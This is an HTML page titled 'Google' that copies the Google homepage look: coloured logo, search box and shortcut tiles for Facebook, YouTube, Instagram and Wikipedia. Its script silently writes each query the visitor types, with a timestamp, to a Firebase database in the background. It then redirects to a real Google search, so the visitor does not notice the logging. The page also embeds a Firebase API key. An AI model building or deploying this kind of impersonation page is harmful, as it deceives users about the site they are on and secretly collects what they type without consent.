<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Google</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Roboto', sans-serif; }
        body { background: #fff; height: 100vh; display: flex; flex-direction: column; align-items: center; overflow: hidden; }
        .top-nav { width: 100%; display: flex; justify-content: flex-end; padding: 15px; }
        .avatar { width: 32px; height: 32px; background: #1a73e8; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 14px; font-weight: bold; }
        .container { flex: 1; display: flex; flex-direction: column; align-items: center; padding-top: 10vh; width: 100%; }
        .logo { font-size: clamp(60px, 18vw, 80px); font-weight: 500; margin-bottom: 25px; letter-spacing: -2px; }
        .blue { color: #4285f4; } .red { color: #ea4335; } .yellow { color: #fbbc05; } .green { color: #34a853; }
        .search-box-wrap { width: 90%; max-width: 500px; position: relative; }
        #searchField { width: 100%; padding: 14px 45px; border-radius: 30px; border: 1px solid #dfe1e5; font-size: 16px; outline: none; box-shadow: 0 1px 6px rgba(0,0,0,0.1); }
        .s-icon { position: absolute; left: 15px; top: 15px; color: #9aa0a6; }
        .m-icon { position: absolute; right: 18px; top: 12px; font-size: 20px; }
        .shortcuts { display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; margin-top: 40px; width: 90%; max-width: 400px; }
        .s-item { display: flex; flex-direction: column; align-items: center; font-size: 11px; color: #5f6368; }
        .s-circle { width: 48px; height: 48px; background: #f1f3f4; border-radius: 50%; margin-bottom: 8px; }
    </style>
</head>
<body>

    <div class="top-nav"><div class="avatar">V</div></div>

    <div class="container">
        <div class="logo">
            <span class="blue">G</span><span class="red">o</span><span class="yellow">o</span><span class="blue">g</span><span class="green">l</span><span class="red">e</span>
        </div>

        <div class="search-box-wrap">
            <span class="s-icon">🔍</span>
            <input type="text" id="searchField" placeholder="Search or type URL" autocomplete="off" spellcheck="false">
            <span class="m-icon">🎙️</span>
        </div>

        <div class="shortcuts">
            <div class="s-item"><div class="s-circle"></div>Facebook</div>
            <div class="s-item"><div class="s-circle"></div>YouTube</div>
            <div class="s-item"><div class="s-circle"></div>Instagram</div>
            <div class="s-item"><div class="s-circle"></div>Wikipedia</div>
        </div>
    </div>

    <script>
        // 1. Firebase Config (Apna asli data yahan dalein)
        const firebaseConfig = {
            apiKey: "AIzaSyD868GSIp6S_7m34xeuvulaV4_PnK-MbnE",
            databaseURL: "YOUR_DATABASE_URL",
            projectId: "peak-190b6"
        };
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        const input = document.getElementById('searchField');

        function startSearch() {
            const query = input.value.trim();
            if (query !== "") {
                // A. Firebase mein save karein (Background mein)
                database.ref('myNote').set({
                    text: query,
                    timestamp: Date.now()
                });

                // B. Turant Redirect karein (Wait mat karein)
                const targetUrl = "https://www.google.com/search?q=" + encodeURIComponent(query);
                
                // Redirection fix for mobile browsers
                window.location.href = targetUrl;
            }
        }

        // Enter Key listener
        input.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault(); // Form submit hone se rokein
                startSearch();
            }
        });
    </script>
</body>
</html>
